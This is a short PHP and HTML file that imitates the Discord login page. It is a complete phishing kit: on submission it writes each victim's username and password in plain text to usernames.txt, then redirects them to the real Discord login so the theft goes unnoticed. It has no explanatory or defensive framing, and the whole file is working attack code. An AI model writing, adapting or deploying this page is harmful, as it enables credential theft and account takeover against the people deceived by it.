<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = "username: " . $_POST['username'] . " | password: " . $_POST['password'] . "\n";
    file_put_contents("usernames.txt", $data, FILE_APPEND);
    header("Location: https://discord.com/login");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>Discord – Log In</title><meta charset="UTF-8"></head>
<body style="background: #36393f; font-family: Arial, sans-serif; text-align: center; margin-top: 100px;">
<div style="background: #2f3136; width: 400px; margin: auto; padding: 40px; border-radius: 8px;">
<h1 style="color: white;">Discord</h1>
<form method="post">
<input type="text" name="username" placeholder="Email or phone number" style="width: 90%; padding: 14px; margin: 10px 0; background: #202225; border: none; color: white; border-radius: 4px;" required><br>
<input type="password" name="password" placeholder="Password" style="width: 90%; padding: 14px; margin: 10px 0; background: #202225; border: none; color: white; border-radius: 4px;" required><br>
<button type="submit" style="background: #5865f2; color: white; width: 95%; padding: 12px; border: none; border-radius: 4px;">Log In</button>
</form>
</div>
</body>
</html>
